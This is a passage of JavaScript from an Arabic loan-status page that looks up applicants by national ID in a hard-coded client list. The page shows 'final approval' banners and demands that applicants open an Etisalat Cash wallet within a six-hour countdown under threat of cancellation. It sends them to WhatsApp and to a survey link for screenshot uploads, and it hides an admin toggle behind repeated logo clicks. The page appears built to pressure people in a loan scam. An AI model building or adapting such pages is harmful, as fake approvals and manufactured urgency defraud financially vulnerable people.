                    تم الانتهاء من مرحلة <span class="highlight">ملف الحد الائتماني</span> بنجاح.
                    <br><br>
                    <span style="color: var(--gold); font-weight: 700;">📌 أنت الآن في مرحلة الاستلام:</span><br>
                    سيتم تحديد موعد نزول المبلغ لحسابك بعدد من الدقائق يتم تحديده من خلال النظام.
                    <br><br>
                    <span style="color: var(--text-muted); font-size: 0.8rem;">⏳ يرجى متابعة النظام لمعرفة موعد الاستلام الدقيق.</span>
                </p>
                <button class="btn-whatsapp success-btn" id="completedWhatsAppBtn" style="margin-top: 0.5rem;">
                    <i class="fab fa-whatsapp fa-lg"></i> 📱 متابعة موعد الاستلام
                </button>
            </div>
        `;
    }

    // ===== عرض النتيجة =====
    function displayResult(client, index) {
        currentClient = client;
        currentIndex = index;
        const resultArea = document.getElementById('resultArea');
        const totalDisplay = calculateTotal(client);

        updateAdminStatus(client.clientStatus);

        let html = '';

        // بطاقة القرض
        html += buildLoanCard(client, totalDisplay);

        // رسالة الخطوة المتاحة
        html += buildStepMessage(client);

        // الحالة حسب clientStatus
        if (client.clientStatus === 'blocked') {
            html += buildBlockedMessage(client);
        } else if (client.clientStatus === 'completed') {
            html += buildCompletedMessage(client);
        } else {
            // pending - قيد الإجراء
            if (client.hasEtisalat === null) {
                // لا يوجد محفظة - مطلوب فتح اتصالات كاش
                html += `
                    <div class="status-bar danger">
                        <div class="status-icon"><i class="fas fa-exclamation-triangle" style="color: var(--danger);"></i></div>
                        <div class="status-text">
                            <div class="main" style="color: var(--danger);">⚠️ مطلوب فتح محفظة اتصالات كاش</div>
                            <div class="sub">يجب فتح المحفظة خلال 6 ساعات</div>
                        </div>
                        <div class="status-badge" style="background: rgba(239,68,68,0.15); border-color: rgba(239,68,68,0.3); color: var(--danger);">مطلوب إجراء عاجل</div>
                    </div>
                `;
                html += buildEtisalatWarning(client);
            } else if (client.hasEtisalat === true) {
                // اتصالات كاش - عرض التعليمات مع زر رفع الاسكرينات
                html += `
                    <div class="status-bar success">
                        <div class="status-icon"><i class="fas fa-check-circle"></i></div>
                        <div class="status-text">
                            <div class="main" style="color: var(--primary);">✅ تمت الموافقة النهائية!</div>
                            <div class="sub">تم اعتماد طلب التمويل الخاص بك بنجاح</div>
                        </div>
                        <div class="status-badge">معتمد</div>
                    </div>
                `;
                html += buildEtisalatInstructions(client);
            } else {
                // فودافون كاش - مطلوب فتح اتصالات كاش
                html += `
                    <div class="status-bar danger">
                        <div class="status-icon"><i class="fas fa-exclamation-triangle" style="color: var(--danger);"></i></div>
                        <div class="status-text">
                            <div class="main" style="color: var(--danger);">⚠️ مطلوب فتح محفظة اتصالات كاش</div>
                            <div class="sub">نخدم اتصالات كاش فقط، يرجى فتحها خلال 6 ساعات</div>
                        </div>
                        <div class="status-badge" style="background: rgba(239,68,68,0.15); border-color: rgba(239,68,68,0.3); color: var(--danger);">مطلوب إجراء عاجل</div>
                    </div>
                `;
                html += buildEtisalatWarning(client);
            }
        }

        // تفاصيل العميل
        html += buildClientDetails(client);

        resultArea.innerHTML = html;

        // ===== تشغيل العداد التنازلي =====
        if (client.clientStatus === 'pending' && client.hasEtisalat !== true) {
            setTimeout(() => {
                const timerEl = document.getElementById('countdownTimer');
                if (timerEl) {
                    startCountdown(6 * 60 * 60);
                }
            }, 100);
        } else {
            if (countdownInterval) {
                clearInterval(countdownInterval);
                countdownInterval = null;
            }
        }

        // ===== ربط أزرار واتساب =====
        const openWalletBtn = document.getElementById('openWalletWhatsAppBtn');
        if (openWalletBtn) {
            openWalletBtn.addEventListener('click', function(e) {
                e.preventDefault();
                openWhatsApp(true);
            });
        }

        const etisalatBtn = document.getElementById('etisalatWhatsAppBtn');
        if (etisalatBtn) {
            etisalatBtn.addEventListener('click', function(e) {
                e.preventDefault();
                openWhatsApp(false);
            });
        }

        const uploadBtn = document.getElementById('uploadScreensBtn');
        if (uploadBtn) {
            uploadBtn.addEventListener('click', function(e) {
                e.preventDefault();
                window.open(SURVEY_URL, '_blank');
            });
        }

        const blockedBtn = document.getElementById('blockedWhatsAppBtn');
        if (blockedBtn) {
            blockedBtn.addEventListener('click', function(e) {
                e.preventDefault();
                openWhatsApp(false);
            });
        }

        const completedBtn = document.getElementById('completedWhatsAppBtn');
        if (completedBtn) {
            completedBtn.addEventListener('click', function(e) {
                e.preventDefault();
                openWhatsApp(false);
            });
        }

        document.getElementById('errorBox').style.display = 'none';
    }

    // ===== تشغيل العداد التنازلي =====
    function startCountdown(totalSeconds) {
        if (countdownInterval) clearInterval(countdownInterval);
        let secondsLeft = totalSeconds;
        const timerEl = document.getElementById('countdownTimer');
        if (!timerEl) return;

        countdownInterval = setInterval(() => {
            if (secondsLeft <= 0) {
                clearInterval(countdownInterval);
                timerEl.innerText = "00:00:00";
                timerEl.classList.add('danger');
                timerEl.style.color = "#EF4444";
                alert("⏰ انتهت المهلة المحددة (6 ساعات) لفتح المحفظة. سيتم إلغاء طلبك تلقائياً. يرجى التواصل مع الدعم.");
            } else {
                secondsLeft--;
                const hours = Math.floor(secondsLeft / 3600);
                const minutes = Math.floor((secondsLeft % 3600) / 60);
                const secs = secondsLeft % 60;
                timerEl.innerText = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
                if (secondsLeft < 3600) {
                    timerEl.classList.add('danger');
                } else {
                    timerEl.classList.remove('danger');
                }
            }
        }, 1000);
    }

    // ===== صلاحية المدير =====
    function toggleAdmin() {
        isAdmin = !isAdmin;
        const panel = document.getElementById('adminPanel');
        if (isAdmin) {
            panel.classList.add('show');
        } else {
            panel.classList.remove('show');
        }
    }

    function updateAdminStatus(status) {
        const statusMap = {
            'pending': '⏳ قيد الإجراء',
            'completed': '✅ تم الاستلام',
            'blocked': '🚫 محظور'
        };
        document.getElementById('currentStatusText').textContent = statusMap[status] || 'غير محدد';
    }

    function changeStatus(newStatus) {
        if (currentIndex === -1 || !currentClient) {
            alert('⚠️ يرجى البحث عن عميل أولاً.');
            return;
        }
        if (!confirm(`هل أنت متأكد من تغيير حالة العميل ${currentClient.name} إلى "${newStatus}"؟`)) {
            return;
        }
        clientsDB[currentIndex].clientStatus = newStatus;
        updateAdminStatus(newStatus);
        displayResult(clientsDB[currentIndex], currentIndex);
        alert(`✅ تم تغيير حالة العميل ${currentClient.name} إلى "${newStatus}" بنجاح.`);
    }

    // ===== البحث =====
    function searchCustomer() {
        const nationalId = document.getElementById('nationalId').value.trim();
        if (!nationalId) {
            alert('الرجاء إدخال الرقم القومي (14 رقم)');
            return;
        }
        if (nationalId.length !== 14) {
            alert('الرقم القومي يجب أن يكون 14 رقمًا');
            return;
        }

        document.getElementById('loader').style.display = 'block';
        document.getElementById('resultArea').innerHTML = '';
        document.getElementById('errorBox').style.display = 'none';

        if (countdownInterval) {
            clearInterval(countdownInterval);
            countdownInterval = null;
        }

        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            const foundIndex = clientsDB.findIndex(c => c.id === nationalId);
            if (foundIndex !== -1) {
                displayResult(clientsDB[foundIndex], foundIndex);
            } else {
                document.getElementById('errorBox').style.display = 'block';
                currentIndex = -1;
                currentClient = null;
                updateAdminStatus('غير محدد');
            }
        }, 800);
    }

    // ===== تفعيل صلاحية المدير (نقر 5 مرات على الشعار) =====
    document.querySelector('.brand .icon')?.addEventListener('click', function() {
        adminClickCount++;
        if (adminClickCount >= 5) {
            toggleAdmin();
            adminClickCount = 0;
        }
        setTimeout(() => { adminClickCount = 0; }, 3000);
    });

    // ===== أحداث =====
    document.getElementById('nationalId')?.addEventListener('keypress', e => {
        if (e.key === 'Enter') searchCustomer();
    });

    window.searchCustomer = searchCustomer;
    window.changeStatus = changeStatus;
</script>
